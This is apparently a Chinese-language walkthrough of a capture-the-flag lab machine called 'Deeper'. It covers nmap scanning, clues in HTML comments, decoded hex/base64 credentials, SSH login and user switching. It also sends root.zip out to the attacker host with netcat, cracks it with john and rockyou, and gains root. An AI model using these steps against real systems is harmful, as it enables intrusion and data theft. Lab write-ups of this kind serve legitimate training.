# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 23:02 EST
Nmap scan report for 192.168.21.8
Host is up (0.00044s latency).
MAC Address: 08:00:27:F2:F7:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 8.26 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 23:03 EST
Nmap scan report for 192.168.21.8
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 37:d1:6f:b5:a4:96:e8:78:18:c7:77:d0:3e:20:4e:55 (ECDSA)
|_  256 cf:5d:90:f3:37:3f:a4:e2:ba:d5:d7:25:c6:4a:a0:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Deeper
MAC Address: 08:00:27:F2:F7:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.21.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="#101010"><center>

                <p>
                        <font size="6" color="ffa200">
                        Let's see where these lights lead...
                        <!-- GO "deeper" -->
                </font>
                </p>
                <p>
                        <img src="/img/index.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@mischievous_penguins?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Casey Horner</a> on <a href="https://unsplash.com/photos/5p-3r7kBhKc?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
                        </font>
                </p>

        </center></body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8/deeper/                    
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="101010"><center>

                <p>
                        <font size="6" color="FFA200">
                        You have to go deeper
                </font>
                </p>
                <p>
                        <img src="/img/index2.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@jorgerojas?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Jorge Rojas</a> on <a href="https://unsplash.com/photos/dbj0O83MM5Y?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>
                        </font>
                </p>
                <!-- GO evendeeper -->
        </center></body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8/deeper/evendeeper/
<!DOCTYPE html>
<html>
        <head>
                <title>
                        Deeper
                </title>
        </head>
        <body bgcolor="101010"><center>

                <p>
                        <font size="6" color="FFA200">
                        Now start digging
                </font>
                </p>
                <p>
                        <img src="/img/index3.jpg" width="960" height="640"/>
                        <br />
                        <font size="2" color="FFFFFF">
                        Photo by <a href="https://unsplash.com/@design_maffeisluca?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Luca Maffeis</a> on <a href="https://unsplash.com/photos/iY_cqJome-A?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>                                                                                                                                                                                                                                                                                                        <!-- USER .- .-.. .. -.-. . -->
                        </font>
                </p>
        </center></body>
</html>
<!-- PASS 53586470624778486230526c5a58426c63673d3d -->
```

解码一下

<img width="239" height="435" alt="图片" src="https://github.com/user-attachments/assets/dd2c71a2-3766-4986-a831-b30213dee339" />

<img width="508" height="433" alt="图片" src="https://github.com/user-attachments/assets/ef9f0c4b-e44b-4237-b210-91c122ece9ab" />

尝试登录ssh

```
┌──(kali㉿kali)-[~]
└─$ ssh alice@192.168.21.8
alice@192.168.21.8's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```

# 权限提升

```
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d
```

解码一下

<img width="507" height="444" alt="图片" src="https://github.com/user-attachments/assets/0b64b689-3f6e-4ead-88eb-647aff80feab" />

切换一下用户

```
alice@deeper:~$ su bob
Password: 
bob@deeper:/home/alice$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip | nc 192.168.21.7 4444
^C
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444 > root.zip
listening on [any] 4444 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.8] 60328
┌──(kali㉿kali)-[~]
└─$ unzip root.zip 
Archive:  root.zip
[root.zip] root.txt password: 
   skipping: root.txt                incorrect password
```

爆破一下文件

```
┌──(kali㉿kali)-[~]
└─$ zip2john root.zip > hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                     
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bob              (root.zip/root.txt)     
1g 0:00:00:00 DONE (2026-02-08 23:27) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s christal..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                
                                                                     
┌──(kali㉿kali)-[~]
└─$ cat root.txt 
root:IhateMyPassword
bob@deeper:~$ su
Password: 
root@deeper:/home/bob# id
uid=0(root) gid=0(root) groups=0(root)
```
